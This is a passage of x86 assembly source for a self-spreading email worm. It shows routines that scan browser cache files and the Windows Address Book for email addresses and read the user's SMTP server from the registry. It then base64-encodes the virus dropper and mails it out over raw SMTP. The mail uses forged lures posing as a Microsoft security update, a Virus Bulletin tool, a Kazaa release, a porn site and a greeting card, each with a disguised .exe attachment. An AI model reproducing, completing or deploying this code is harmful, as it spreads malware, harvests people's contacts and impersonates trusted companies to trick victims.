	push	eax
	call	[ebp + LoadLibrary]
	cmp	eax,0h
	je	ExitTMS
	mov	[ebp + shell_h],eax
	lea	ebx,[ebp + _SHGetSpecialFolderPath]
	push	ebx
	push	eax
	call	[ebp + __GetProcAddress]
	cmp	eax,0h
	je	UnloadSh
	xor	ecx,ecx
	push	ecx
	push	CSIDL_INTERNET_CACHE		;get temporary internet files directory
	lea	ebx,[ebp + TempDir]
	push	ebx
	push	ecx
	call	eax
	cmp	eax,1h				;success ?
	jne	UnloadSh			
	lea	eax,[ebp + TempDir]
	push	eax
	call	[ebp + SetCurrentDirectory]
____1_:	push	0c800h				;50k
	push	GPTR
	call	[ebp + GlobalAlloc]		;allocate 50k of memory which used to store mails
	cmp	eax,0h
	je	UnloadSh
	mov	[ebp + MailsMemory],eax
	mov	[ebp + LastMailPointer],0
	mov	[ebp + NumberOfEmails],0
	mov	[ebp + NewMail],0h
	call	FindFiles
UnloadSh:					;unload shell library
	push	dword ptr [ebp + shell_h]
	call	[ebp + FreeLibrary]
ExitTMS:ret					;exit temp mails search
	

	shell_dll	db	"Shell32.dll",0
	shell_h		dd	0
	_SHGetSpecialFolderPath	db	"SHGetSpecialFolderPathA",0

	
	CSIDL_INTERNET_CACHE	equ	0020h

	MailsMemory	dd	0
	NumberOfEmails	dw	0
	TempDir	db	0ffh	dup(0)
	
	
FindFiles:
	;recursive scan directorys for files
	lea	eax,[ebp + WIN32_FIND_DATA]
	push	eax
	lea	eax,[ebp + search_mask]
	push	eax
	call	[ebp + FindFirstFile]
	cmp	eax,INVALID_HANDLE_VALUE
	je	ExitFind
	mov	dword ptr [ebp + hfind],eax		;save search handle
@find:	mov	eax,[ebp + dwFileAttributes]
	and	eax,FILE_ATTRIBUTE_DIRECTORY
	cmp	eax,FILE_ATTRIBUTE_DIRECTORY		;is directory ?
	jne	Is_File
	cmp	byte ptr [ebp + cFileName],"."		;most be not .. or .
	je	FindNext
	push	dword ptr [ebp + hfind]			;save search handle
	lea	eax,[ebp + cFileName]
	push	eax
	call	[ebp + SetCurrentDirectory]
	cmp	eax,1h
	je	_SD
	pop	eax					;restore stack
	jmp	FindNext
_SD:	call	FindFiles
	pop	dword ptr [ebp + hfind]			;restore search handle
	lea	eax,[ebp + dotdot]
	push	eax
	call	[ebp + SetCurrentDirectory]
	jmp	FindNext	
Is_File:
	lea	eax,[ebp + cFileName]			;do action
	call	ScanFileForMails
FindNext:	
	lea	eax,[ebp + WIN32_FIND_DATA]
	push	eax
	push	dword ptr [ebp + hfind]
	call	[ebp + FindNextFile]
	cmp	eax,0h
	jne	@find					;move to next file
ExitFind:
	push	dword ptr [ebp + hfind]
	call	[ebp + FindClose]			;close the file handle
	ret						;exit search

	dotdot	db	"..",0
	FILE_ATTRIBUTE_DIRECTORY	equ	00000010h
	

;scan htm,asp,xml files for emails
;input:
;	eax - file name
;output:
;	none	
ScanFileForMails:
	pushad
	lea	ecx,[ebp + MailSearchErr]
	push	ecx
	xor	ecx,ecx
	push	dword ptr fs:[ecx]
	mov	fs:[ecx],esp
@gSize:	cmp	byte ptr [eax + ecx],0h		;get size of file name
	je	ChkExt
	inc	ecx
	jmp	@gSize
ChkExt:	sub	ecx,4h
	cmp	dword ptr [eax + ecx],"mth."	;is .htm ?
	je	_1
	cmp	dword ptr [eax + ecx],"psa."	;is .asp ?
	je	_1
	cmp	dword ptr [eax + ecx],"lmx."	;is .xml ?
	jne	ExitMS
_1:	push	0h
	push	FILE_ATTRIBUTE_NORMAL
	push	OPEN_EXISTING
	push	0h
	push	FILE_SHARE_READ
	push	GENERIC_READ
	push	eax				;file name
	call	[ebp + CreateFile]
	cmp	eax,INVALID_HANDLE_VALUE
	je	ExitMS
	mov	[ebp + hfile],eax
	xor	eax,eax
	push	eax
	push	eax
	push	eax
	push	PAGE_READONLY
	push	eax
	push	[ebp + hfile]
	call	[ebp + CreateFileMapping]
	cmp	eax,0h
	je	_CloseF
	mov	[ebp + hmap],eax
	push	0h
	push	[ebp + hfile]
	call	[ebp + GetFileSize]
	cmp	eax,0ffffffffh
	je	_CloseM
	cmp	eax,14000h
	ja	_CloseM					;dont scan files which are > 80k
	cmp	eax,200h
	jb	_CloseM					;dont scan file which are < 512 bytes
	mov	[ebp + _FSize],eax
	xor	eax,eax
	push	eax
	push	eax
	push	eax
	push	FILE_MAP_READ
	push	[ebp + hmap]
	call	[ebp + MapViewOfFile]			;map file into memory
	cmp	eax,0h
	je	_CloseM
	mov	[ebp + mapbase],eax			;file in the memory
	mov	ecx,[ebp + _FSize]			;size of file
	sub	ecx,0ah
	cmp	ecx,0h
	jbe	Unmap
	mov	edi,[ebp + MailsMemory]			;where to store mails
@lm:	cmp	byte ptr [edi],0h
	je	_1_
	inc	edi
	jmp	@lm
_1_:	mov	[ebp + LastMailPointer],0h
@checkM:cmp	dword ptr [eax],"liam"
	jne	NotMail
	cmp	dword ptr [eax + 3h],":otl"
	jne	NotMail
	add	eax,7h					;skip the mailto:
	cmp	byte ptr [ebp + NewMail],0h
	je	checkC
@lm2:	cmp	byte ptr [edi],0h			;move to last mail
	jne	_2_
	cmp	byte ptr [edi-1],0h			;and leave 0 between the
	je	checkC					;new mail to the last mail
_2_:	inc	edi
	jmp	@lm2
checkC:	cmp	byte ptr [eax],'?'			;check char
	je	_Stop
	cmp	byte ptr [eax],'"'
	je	_Stop
	cmp	byte ptr [eax],'@'
	je	@cpyM
	cmp	byte ptr [eax],'.'
	je	@cpyM
	cmp	byte ptr [eax],7ah
	ja	BadMail
	cmp	byte ptr [eax],30h
	jnb	@cpyM
	jmp	BadMail
@cpyM:	mov	bl,byte ptr [eax]
	mov	byte ptr [edi],bl
	inc	eax
	inc	edi
	inc	dword ptr [ebp + LastMailPointer]
	jmp	checkC
_Stop:	inc	[ebp + NumberOfEmails]
	inc	edi
	mov	byte ptr [ebp + NewMail],1h
	inc	dword ptr [ebp + LastMailPointer]
NotMail:inc	eax
	loop	@checkM
Unmap:	push	[ebp + mapbase]
	call	[ebp + UnMapViewOfFile]
_CloseM:push	[ebp + hmap]
	call	[ebp + CloseHandle]
_CloseF:push	[ebp + hfile]
	call	[ebp + CloseHandle]
ExitMS:	pop	dword ptr fs:[0]
	add	esp,4h
	popad
	ret						;exit mail search


MailSearchErr:
	mov	esp,[esp + 8h]				;restore stack
	pop	dword ptr fs:[0]
	add	esp,4h
	popad
	push	[ebp + mapbase]
	call	[ebp + UnMapViewOfFile]
	push	[ebp + hmap]
	call	[ebp + CloseHandle]
	push	[ebp + hfile]
	call	[ebp + CloseHandle]
	ret
	
BadMail:
	sub	edi,[ebp + LastMailPointer]		;restore mail pointer,if we
	jmp	NotMail					;copy invalid mail
	
	
	
	_FSize	dd	0
	LastMailPointer	dd	0
	NewMail	db	0

	
SYSTEMTIME:
	wYear	dw	0
	wMonth	dw	0
	wDayOfWeek	dw	0
	wDay	dw	0
	wHour	dw	0
	wMinute	dw	0
	wSecond	dw	0
	wMilliseconds	dw	0	
	
	
CheckConditions:
	;check time & internet connection
	lea	eax,[ebp + SYSTEMTIME]
	push	eax
	call	[ebp + GetLocalTime]		;get system time
	cmp	word ptr [ebp + wMinute],2dh	;minute most be > 45
	jb	BadConditions
	cmp	word ptr [ebp + wDay],19h	;day most be < 25
	ja	BadConditions
	cmp	word ptr [ebp + wSecond],1eh	;second most be > 30
	jb	BadConditions
	lea	eax,[ebp + WinInetDll]
	push	eax
	call	[ebp + LoadLibrary]
	cmp	eax,0h
	je	BadConditions
	xchg	edx,eax
	lea	eax,[ebp + _InternetCheckConnection]
	push	eax
	push	edx
	call	[ebp + __GetProcAddress]
	cmp	eax,0h
	je	BadConditions
	push	0h
	push	FLAG_ICC_FORCE_CONNECTION
	lea	ebx,[ebp + SiteToCheck]
	push	ebx
	call	eax
	cmp	eax,0h				;there is internet connection ?
	je	BadConditions
	push	edx
	call	[ebp + FreeLibrary]
	stc
	ret
BadConditions:
	clc
	ret
	
	
	WinInetDll	db	"Wininet.dll",0
	_InternetCheckConnection	db	"InternetCheckConnectionA",0
	FLAG_ICC_FORCE_CONNECTION	equ	00000001h
	SiteToCheck	db	"http://www.google.com/",0
	


FromAndSubject1:

	;from and subject
	db	"From:Microsoft Security Alert <SecurityUpdate@Microsoft.com>",0dh,0ah
	db	"Subject:Microsoft Security Update",0dh,0ah
	
	SizeOfFromAndSubject1	equ	($-FromAndSubject1)

FromAndSubject2:

	;from and subject
	db	"From:WorldSex.com <Pictures@WorldSex.com>",0dh,0ah
	db	"Subject:Your Dayly Pictures",0dh,0ah
	
	SizeOfFromAndSubject2	equ	($-FromAndSubject2)

FromAndSubject3:

	;from and subject
	db	"From:Virus Bulletin <Support@Virusbtn.com>",0dh,0ah
	db	"Subject:A New Tool From Virus Bulletin",0dh,0ah
	
	SizeOfFromAndSubject3	equ	($-FromAndSubject3)

FromAndSubject4:

	;from and subject
	db	"From:Kazaa.com <Support@Kazaa.com>",0dh,0ah
	db	"Subject:Get YourSelf Kazaa Media Desktop !!!",0dh,0ah
	
	SizeOfFromAndSubject4	equ	($-FromAndSubject4)

FromAndSubject5:

	;from and subject
	db	"From:Greeting-Card.com <FreeGreeting@Greeting-Cards.com>",0dh,0ah
	db	"Subject:You've got an e-card at greeting-cards.com",0dh,0ah
	
	SizeOfFromAndSubject5	equ	($-FromAndSubject5)



MessageMimeHeader:

	db	"MIME-Version: 1.0",0dh,0ah
	db	"Content-Type: multipart/mixed;",0dh,0ah
	db	' boundary="bound1"',0dh,0ah
	db	"X-Priority: 3",0dh,0ah
	db	"X-MSMail-Priority: Normal",0dh,0ah
	db	"X-Mailer: Microsoft Outlook Express 6.00.2800.1106",0dh,0ah
	db	"X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2800.1106",0dh,0ah
	db	0dh,0ah,"This is a multi-part message in MIME format.",0dh,0ah
	db	"--bound1",0dh,0ah
	db	"Content-Type: text/plain;",0dh,0ah
	db	' charset="windows-1255"',0dh,0ah
	db	"Content-Transfer-Encoding: 7bit",0dh,0ah,0dh,0ah
	
	SizeOfMessageMimeHeader	equ	($-MessageMimeHeader)
	
	
	
	;message and filename
MessageAndFileName1:

	db	"Dear Microsoft Customer",0dh,0ah,0dh,0ah
	db	"A new vulnerability has been discovered in Internet Explorer",0dh,0ah
	db	"we recommending you to update internet explorer as soon as",0dh,0ah
	db	"possible, this vulnerablility is critical and may allow",0dh,0ah
	db	"execution of malicious code on your system while you use internet",0dh,0ah
	db	"explorer.",0dh,0ah,0dh,0ah
	db	"vulnerable versions:",0dh,0ah
	db	"Internet Explorer 5.0",0dh,0ah
	db	"Internet Explorer 6.0",0dh,0ah
	db	"if you using one of this versions please install attached update.",0dh,0ah,0dh,0ah
	db	"Thank You.",0dh,0ah,"The Microsoft Security Team.",0dh,0ah,0dh,0ah
	db	"If you do not wish to receive future Security Update E-mail from",0dh,0ah
	db	"Microsoft, or believe you were subscribed in error, please send",0dh,0ah
	db	"a blank E-mail to SecurityUpdate@microsoft.com",0dh,0ah
	db	"--bound1",0dh,0ah
	db	"Content-Type: application/octet-stream;",0dh,0ah
	db	' name= "Internet Explorer Update.exe"',0dh,0ah
	db	"Content-Transfer-Encoding: base64",0dh,0ah
	db	"Content-Disposition: attachment;",0dh,0ah
	db	'	filename= "Internet Explorer Update.exe"',0dh,0ah,0dh,0ah

	SizeOfMessageAndFileName1	equ	($-MessageAndFileName1)	
	
	
MessageAndFileName2:

	db	"150 XXX Pictures For You !!!",0dh,0ah,0dh,0ah
	db	"here are your dayly xxx pictures.",0dh,0ah
	db	"Have Fun & Enjoy...",0dh,0ah,0dh,0ah
	db	"we like to inform you that your account at",0dh,0ah	;try to make this letter formal :)
	db	"our web site will be expired at the end of",0dh,0ah
	db	"this month,please renew your account",0dh,0ah
	db	"renew of account for old members is only 25$",0dh,0ah
	db	"per half year.",0dh,0ah,0dh,0ah
	db	"Please Visit Our Web Site:",0dh,0ah
	db	"http://www.WorldSex.com/",0dh,0ah
	db	"--bound1",0dh,0ah
	db	"Content-Type: application/octet-stream;",0dh,0ah
	db	' name= "150_XXX_Pictures.exe"',0dh,0ah
	db	"Content-Transfer-Encoding: base64",0dh,0ah
	db	"Content-Disposition: attachment;",0dh,0ah
	db	'	filename= "150_XXX_Pictures.exe"',0dh,0ah,0dh,0ah

	SizeOfMessageAndFileName2	equ	($-MessageAndFileName2)	
		
	
MessageAndFileName3:

	db	"Dear Symantec/F-Secure/Mcafee/Trend Micro User",0dh,0ah,0dh,0ah
	db	"We Have Developed A New Tool That Can Block New",0dh,0ah
	db	"Internet Worms From Attacking Your Computer,We",0dh,0ah
	db	"Recommending To Install This Tool Before A New",0dh,0ah
	db	"Internet Worm Will Start To Spread",0dh,0ah,0dh,0ah
	db	"How To Use The Tool:",0dh,0ah
	db	"Just Run The Attached File,After You Have Run It",0dh,0ah
	db	"Follow The Instructions.",0dh,0ah,0dh,0ah
	db	"Thank You.",0dh,0ah,"The Virus Bulletin Security Team.",0dh,0ah
	db	"For More Information Please Visit Our Web Site:",0dh,0ah
	db	"		http://www.virusbtn.com/",0dh,0ah,0dh,0ah
	db	"If you do not wish to receive future antivirus tools from",0dh,0ah
	db	"Virus Bulletin, or believe you were subscribed in error, ",0dh,0ah
	db	"please send,a blank E-mail to Subscribe@Virusbtn.com",0dh,0ah
	db	"--bound1",0dh,0ah
	db	"Content-Type: application/octet-stream;",0dh,0ah
	db	' name= "Antivirus Update.exe"',0dh,0ah
	db	"Content-Transfer-Encoding: base64",0dh,0ah
	db	"Content-Disposition: attachment;",0dh,0ah
	db	'	filename= "Antivirus Update.exe"',0dh,0ah,0dh,0ah

	SizeOfMessageAndFileName3	equ	($-MessageAndFileName3)	
		
	
MessageAndFileName4:
	db	"Dear User.",0dh,0ah,0dh,0ah
	db	"Sharman Networks Wants To offer You The New",0dh,0ah
	db	"Version Of Kazaa !!!",0dh,0ah
	db	"Please Read Product Description Below:",0dh,0ah,0dh,0ah
	db	"Kazaa Media Desktop is the world's No. 1",0dh,0ah
	db	"free, peer-to-peer, file-sharing software",0dh,0ah
	db	"application. Features include improved",0dh,0ah
	db	"privacy protection; the ability to search",0dh,0ah
	db	"for and download music, playlists, software,",0dh,0ah
	db	"video files, documents, and images; the",0dh,0ah
	db	"ability to set up and manage music and video",0dh,0ah
	db	"playlists; and the ability to perform",0dh,0ah
	db	"multiple simultaneous searches, including",0dh,0ah
	db	"up to five Search Mores, which deliver up",0dh,0ah
	db	"to 1,000 results per search term.",0dh,0ah,0dh,0ah
	db	"We Have Included A Free Version Of Kazaa In",0dh,0ah
	db	"This Mail,Try It !!!",0dh,0ah,0dh,0ah
	db	"Thank You.",0dh,0ah,"Sharman Networks.",0dh,0ah,0dh,0ah
	db	"If you do not wish to receive future E-mail's from",0dh,0ah
	db	"Sharman Networks, or believe you were subscribed in",0dh,0ah
	db	"error, please send a blank E-mail to Remove@kazaa.com",0dh,0ah
	db	"--bound1",0dh,0ah
	db	"Content-Type: application/octet-stream;",0dh,0ah
	db	' name= "Kazaa Media Desktop.exe"',0dh,0ah
	db	"Content-Transfer-Encoding: base64",0dh,0ah
	db	"Content-Disposition: attachment;",0dh,0ah
	db	'	filename= "Kazaa Media Desktop.exe"',0dh,0ah,0dh,0ah

	SizeOfMessageAndFileName4	equ	($-MessageAndFileName4)	
		

MessageAndFileName5:

	db	"Greeting-Cards.com have sent you a Greeting Card",0dh,0ah,0dh,0ah
	db	"One Of Your Friends Wish You Happy Year",0dh,0ah
	db	"Love,Fun,Good Life,And Good Luck.",0dh,0ah,0dh,0ah
	db	"To Show His Love He Sent You A Greeting",0dh,0ah
	db	"Card,Congratulations !",0dh,0ah,0dh,0ah
	db	"Hope you enjoy our e-cards! Spread the love and send one of our FREE e-cards!",0dh,0ah
	db	"Brought to you by greeting-cards.com - a better way to greet for FREE! ",0dh,0ah
	db	"Please Visit Greeting Cards Web site:http://www.greeting-cards.com/",0dh,0ah
	db	"--bound1",0dh,0ah
	db	"Content-Type: application/octet-stream;",0dh,0ah
	db	' name= "Your Greeting Card.exe"',0dh,0ah
	db	"Content-Transfer-Encoding: base64",0dh,0ah
	db	"Content-Disposition: attachment;",0dh,0ah
	db	'	filename= "Your Greeting Card.exe"',0dh,0ah,0dh,0ah

	SizeOfMessageAndFileName5	equ	($-MessageAndFileName5)	
		

	
EndOfMail:

	db	0dh,0ah,"--bound1--",0dh,0ah
	db	0dh,0ah,'.',0dh,0ah
	
	SizeOfEndOfMail	equ	($-EndOfMail)
	
	
	
	HELO		db	"HELO <localhost>",0dh,0ah
	SizeOfHELO	equ	($-HELO)
	
	
	MAILFROM1	db	"MAIL FROM:<SecurityUpdate@Microsoft.com>",0dh,0ah
	SizeOfMailFrom1	equ	($-MAILFROM1)

	MAILFROM2	db	"MAIL FROM:<FreePictures@WorldSex.com>",0dh,0ah
	SizeOfMailFrom2	equ	($-MAILFROM2)

	MAILFROM3	db	"MAIL FROM:<VirusAlert@Symantec.com>",0dh,0ah
	SizeOfMailFrom3	equ	($-MAILFROM3)

	MAILFROM4	db	"MAIL FROM:<Support@Kazaa.com>",0dh,0ah
	SizeOfMailFrom4	equ	($-MAILFROM4)

	MAILFROM5	db	"MAIL FROM:<Greets@Greeting-Cards.com>",0dh,0ah
	SizeOfMailFrom5	equ	($-MAILFROM5)
	
	
	QUIT		db	"QUIT",0dh,0ah
	SizeOfQuit	equ	($-QUIT)
	RCPT		db	"RCPT TO:<"
	SizeOfRcpt	equ	($-RCPT)
	EndOfRCPT	db	">",0dh,0ah
	SizeOfEndRcpt	equ	($-EndOfRCPT)
	__DATA		db	"DATA",0dh,0ah
	SizeOfData	equ	($-__DATA)
	
	GetBuffer	db	0ffh	dup(0)
	
	VERSION1_1	equ	0101h
	AF_INET		equ	2      
	SOCK_STREAM	equ     1     
	SOCKET_ERR	equ	-1   
	HOSTENT_IP      equ	10h
	IPPROTO_TCP	equ	6h
	
	vsocket		dd	0
WSADATA:	
	mVersion	dw	0
	mHighVersion	dw	0
	szDescription	db	257 dup(0)
	szSystemStatus	db	129 dup(0)
	iMaxSockets	dw	0
	iMaxUpdDg	dw	0
	lpVendorInfo	dd	0

SOCKADDR:
	sin_family	dw	0	
	sin_port	dw	0
	sin_addr        dd      0       
	sin_zero	db	8 dup(0)
	SizeOfSOCKADDR	equ	($-SOCKADDR)

ConnectToServer:
	;connect to smtp server
	lea	eax,[ebp + WSADATA]
	push	eax
	push	VERSION1_1
	call	[ebp + WSAStartup]	;start up winsock
	cmp	eax,0h
	jne	ConnectionErr
	push	IPPROTO_TCP
	push	SOCK_STREAM
	push	AF_INET
	call	[ebp + socket]		;create socket
	cmp	eax,SOCKET_ERR
	je	WSACleanErr
	mov	dword ptr [ebp + vsocket],eax
	push	25			;smtp
	call	[ebp + htons]
	mov	word ptr [ebp + sin_port],ax
	mov	word ptr [ebp + sin_family],AF_INET
	lea	eax,[ebp + SmtpServerAdd]
	push	eax
	call	[ebp + gethostbyname]
	cmp	eax,0h
	je	CloseSockErr
	mov	eax,dword ptr [eax + HOSTENT_IP]
	mov	eax,dword ptr [eax]
	mov	dword ptr [ebp + sin_addr],eax
	push	SizeOfSOCKADDR
	lea	eax,[ebp + SOCKADDR]
	push	eax
	push	dword ptr [ebp + vsocket]
	call	[ebp + connect]
	cmp	eax,0h
	jne	CloseSockErr
	stc
	ret
CloseSockErr:
	push	dword ptr [ebp + vsocket]
	call	[ebp + closesocket]
WSACleanErr:
	call	[ebp + WSACleanup]
ConnectionErr:
	clc
	ret


CreateVirusBase64Image:
	cmp	byte ptr [ebp + Infection_Success],0h	;if we didnt success to infect file
	je	SendDropper				;or the running file is not infected
	xor	ecx,ecx
	lea	esi,[ebp + FileToInfect]
get_len:cmp	byte ptr [esi],0h
	je	CpyPath
	inc	ecx
	inc	esi
	jmp	get_len
CpyPath:inc	ecx
	lea	esi,[ebp + FileToInfect]
	lea	edi,[ebp + wvltg_exe_path]		;we simple send the virus dropper
	rep	movsb
	jmp	_____1
SendDropper:	
	push	0ffh
	lea	eax,[ebp + wvltg_exe_path]
	push	eax
	push	0h
	call	[ebp + GetModuleFileName]
	cmp	eax,0h
	je	Base64CreationErr
_____1:	;open it:
	push	0h
	push	FILE_ATTRIBUTE_NORMAL
	push	OPEN_EXISTING
	push	0h
	push	FILE_SHARE_READ
	push	GENERIC_READ
	lea	eax,[ebp + wvltg_exe_path]
	push	eax
	call	[ebp + CreateFile]
	cmp	eax,INVALID_HANDLE_VALUE
	je	Base64CreationErr
	mov	[ebp + hvirusfile],eax
	;get file size:
	push	0
	push	[ebp + hvirusfile]
	call	[ebp + GetFileSize]
	cmp	eax,0ffffffffh
	je	CloseFileErr
	mov	[ebp + virusfilesize],eax
	push	eax
	xor	edx,edx
	mov	ecx,3h
	div	ecx
	xchg	ecx,eax
	pop	eax
	add	eax,ecx
	mov	ecx,25
	mul	ecx
	add	eax,400h	;allocate more memory than needed,just for safty
	push	eax
	push	GPTR
	call	[ebp + GlobalAlloc]	;allocate memory
	cmp	eax,0h
	je	CloseFileErr
	mov	[ebp + base64outputmem],eax
	;map file into the memory
	xor	eax,eax
	push	eax
	push	eax
	push	eax
	push	PAGE_READONLY
	push	eax
	push	dword ptr [ebp + hvirusfile]
	call	[ebp + CreateFileMapping]
	cmp	eax,0h
	je	B64FreeMemErr
	mov	[ebp + hvirusmap],eax
	xor	eax,eax
	push	eax
	push	eax
	push	eax
	push	FILE_MAP_READ
	push	dword ptr [ebp + hvirusmap]
	call	[ebp + MapViewOfFile]
	cmp	eax,0h
	je	B64CloseMapErr
	mov	[ebp + hvirusinmem],eax
	xchg	eax,esi
	mov	edi,[ebp + base64outputmem]
	mov	ecx,[ebp + virusfilesize]
	call	Base64
	mov	[ebp + sizeofbase64out],eax
	push	[ebp + hvirusinmem]
	call	[ebp + UnMapViewOfFile]
	push	[ebp + hvirusmap]
	call	[ebp + CloseHandle]
	push	[ebp + hvirusfile]
	call	[ebp + CloseHandle]
	stc
	ret
B64CloseMapErr:
	push	dword ptr [ebp + hvirusmap]
	call	[ebp + CloseHandle]
B64FreeMemErr:
	push	dword ptr [ebp + base64outputmem]
	call	[ebp + GlobalFree]
CloseFileErr:
	push	[ebp + hvirusfile]
	call	[ebp + CloseHandle]
Base64CreationErr:
	clc
	ret
	
	wvltg_exe_path	db	0ffh	dup(0)
	hvirusfile	dd	0
	virusfilesize	dd	0
	base64outputmem	dd	0
	sizeofbase64out	dd	0
	hvirusmap	dd	0
	hvirusinmem	dd	0

;input:
;esi - data source
;edi - where to write encoded data
;ecx - size of data to encode
;output:
;eax - size of encoded data
Base64:	xor	edx,edx
	push	edx
@3Bytes:push	edx
	xor	eax,eax
	xor	ebx,ebx
	or	al,byte ptr [esi]
	shl	eax,8h
	inc	esi
	or	al,byte ptr [esi]
	shl	eax,8h
	inc	esi
	or	al,byte ptr [esi]
	inc	esi
	push	ecx
	mov	ecx,4h
@outbit:mov	ebx,eax
	and	ebx,3fh				;leave only 6 bits
	lea	edx,[ebp + Base64Table]
	mov	bl,byte ptr [ebx + edx]
	mov	byte ptr [edi + ecx - 1h],bl
	shr	eax,6h
	loop	@outbit
	pop	ecx
	sub	ecx,2h
	add	edi,4h
	pop	edx
	add	edx,4h
	add	dword ptr [esp],4h
	cmp	ecx,3h
	jb	ExitB64
	cmp	edx,4ch				;did we need to add new line ?
	jne	DoLoop
	xor	edx,edx
	mov	word ptr [edi],0a0dh
	add	edi,2h
	add	dword ptr [esp],2h
DoLoop:	loop	@3Bytes
ExitB64:pop	eax
	ret
	
Base64Table	db	"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"


GetSMTPServer:
	;get the default smtp server from the registry
	mov	dword ptr [ebp + hkey],0h
	lea	eax,[ebp + hkey]
	push	eax
	xor	eax,eax
	push	eax
	push	eax
	lea	eax,[ebp +smtp_key]
	push	eax
	push	HKEY_CURRENT_USER
	call	[ebp + RegOpenKeyEx]
	cmp	eax,ERROR_SUCCESS
	jne	SmtpGetErr
	lea	eax,[ebp + SizeOfAccountNum]
	push	eax
	lea	eax,[ebp + accountnum]
	push	eax
	xor	eax,eax
	push	eax
	push	eax
	lea	eax,[ebp + default_mail]
	push	eax
	push	dword ptr [ebp + hkey]
	call	[ebp + RegQueryValueEx]
	cmp	eax,ERROR_SUCCESS
	jne	CloseKeyErr
	lea	eax,[ebp + accountnum]
	push	eax
	lea	eax,[ebp + accountkey]
	push	eax
	call	[ebp + lstrcat]
	cmp	eax,0h
	je	CloseKeyErr
	lea	eax,[ebp + hkey]
	push	eax
	push	KEY_READ
	push	0h
	lea	eax,[ebp + accountkey]
	push	eax
	push	dword ptr [ebp + hkey]
	call	[ebp + RegOpenKeyEx]
	cmp	eax,ERROR_SUCCESS
	jne	CloseKeyErr
	lea	eax,[ebp + SizeOfSMTPServerAdd]
	push	eax
	lea	eax,[ebp + SmtpServerAdd]
	push	eax
	xor	eax,eax
	push	eax
	push	eax
	lea	eax,[ebp + smtp_server]
	push	eax
	push	dword ptr [ebp + hkey]
	call	[ebp + RegQueryValueEx]
	cmp	eax,ERROR_SUCCESS
	jne	CloseKeyErr
	push	dword ptr [ebp + hkey]
	call	[ebp + RegCloseKey]
	stc
	ret
CloseKeyErr:
	push	dword ptr [ebp + hkey]
	call	[ebp + RegCloseKey]
SmtpGetErr:
	clc
	ret
	
	smtp_key	db	"Software\Microsoft\Internet Account Manager",0
	default_mail	db	"Default Mail Account",0
	smtp_server	db	"SMTP Server",0
	SmtpServerAdd	db	75	dup(0)
	SizeOfSMTPServerAdd	dd	75
	accountnum	db	75	dup(0)
	SizeOfAccountNum	dd	75
	accountkey	db	"Accounts\",75	dup(0)
	
	
	
GetWinsockApis:
	lea	eax,[ebp + WinsockDll]
	push	eax
	call	[ebp + LoadLibrary]
	cmp	eax,0h
	je	GetWinsockApisErr
	mov	dword ptr [ebp + hWinsock],eax
	xchg	eax,edx
	mov	ecx,NumberOfWinsockFunctions
	lea	eax,[ebp + winsock_functions_sz]
	lea	ebx,[ebp + winsock_functions_addresses]
	call	get_apis
	ret
GetWinsockApisErr:
	clc
	ret
	
	WinsockDll	db	"ws2_32.dll",0
	hWinsock	dd	0
	
	
	winsock_functions_sz:
	
	_WSAStartup	db	"WSAStartup",0
	_WSACleanup	db	"WSACleanup",0
	_socket		db	"socket",0
	_gethostbyname	db	"gethostbyname",0
	_connect	db	"connect",0
	_recv		db	"recv",0
	_send		db	"send",0
	_htons		db	"htons",0
	_closesocket	db	"closesocket",0
	
	winsock_functions_addresses:
	
	WSAStartup	dd	0
	WSACleanup	dd	0
	socket		dd	0
	gethostbyname	dd	0
	connect		dd	0
	recv		dd	0
	send		dd	0
	htons		dd	0
	closesocket	dd	0
	
	NumberOfWinsockFunctions	equ	9
	
	
	
	
ScanWAB:				;scan the windows address book for email addresses
	mov	dword ptr [ebp + hkey],0h
	lea	eax,[ebp + hkey]
	push	eax
	xor	eax,eax
	push	eax
	push	eax
	lea	eax,[ebp + WAB_Location]
	push	eax
	push	HKEY_CURRENT_USER
	call	[ebp + RegOpenKeyEx]
	cmp	eax,ERROR_SUCCESS
	jne	WabScanErr
	lea	eax,[ebp + SizeOfWAB_PATH]
	push	eax
	lea	eax,[ebp + WAB_Path]
	push	eax
	xor	eax,eax
	push	eax
	push	eax
	push	eax
	push	[ebp + hkey]
	call	[ebp + RegQueryValueEx]	;get the wab file location
	cmp	eax,ERROR_SUCCESS
	jne	CloseWABkeyAndExit
	push	dword ptr [ebp + hkey]
	call	[ebp + RegCloseKey]
	;open the wab file:
	xor	eax,eax
	push	eax
	push	FILE_ATTRIBUTE_NORMAL
	push	OPEN_EXISTING
	push	eax
	push	FILE_SHARE_READ
	push	GENERIC_READ
	lea	eax,[ebp + WAB_Path]
	push	eax
	call	[ebp + CreateFile]
	cmp	eax,INVALID_HANDLE_VALUE
	je	WabScanErr
	mov	dword ptr [ebp + hWabFile],eax
	;map the wab file:
	xor	eax,eax
	push	eax
	push	eax
	push	eax
	push	PAGE_READONLY
	push	eax
	push	dword ptr [ebp + hWabFile]
	call	[ebp + CreateFileMapping]
	cmp	eax,0h
	jne	MapWab
ErrCMF:	push	dword ptr [ebp + hWabFile]	;error close wab file
	call	[ebp + CloseHandle]
	jmp	WabScanErr
MapWab:	mov	[ebp + hWabMap],eax
	xor	eax,eax
	push	eax
	push	eax
	push	eax
	push	FILE_MAP_READ
	push	dword ptr [ebp + hWabMap]
	call	[ebp + MapViewOfFile]
	cmp	eax,0h
	jne	ReadAddresses
ErrCWM:	push	dword ptr [ebp + hWabMap]	;error close wab map
	call	[ebp + CloseHandle]
	jmp	ErrCMF
ReadAddresses:	
	mov	[ebp +	hWabMapBase],eax
	mov	ax,word ptr [eax + 64h]		;get number of email addresses
	cmp	ax,1h
	jnbe	AllocAddMem
ErrUWF:	push	dword ptr [ebp + hWabMapBase]	;error unmap wab file
	call	[ebp + UnMapViewOfFile]
	jmp	ErrCWM	
AllocAddMem:
	mov	word ptr [ebp + NumberOfMailAddresses],ax
	mov	cx,44h				;every mail address allocated 68 bytes
	mul	cx				;ax = size of allocated memory
	xor	ebx,ebx
	xchg	ax,bx
	push	ebx
	push	GPTR
	call	[ebp + GlobalAlloc]
	cmp	eax,0h
	je	ErrUWF
	mov	[ebp + hMailAddresses],eax
	xchg	eax,ebx
	xor	ecx,ecx
	mov	eax,[ebp + hWabMapBase]
	mov	cx,word ptr [ebp + NumberOfMailAddresses]
	add	eax,[eax + 60h]			;goto start of emails
NxtMail:push	ecx
	mov	ecx,44h
CpyMail:cmp	byte ptr [eax],0h
	je	MovNext
	mov	dl,byte ptr [eax]
	mov	byte ptr [ebx],dl
	inc	ebx
	add	eax,2h
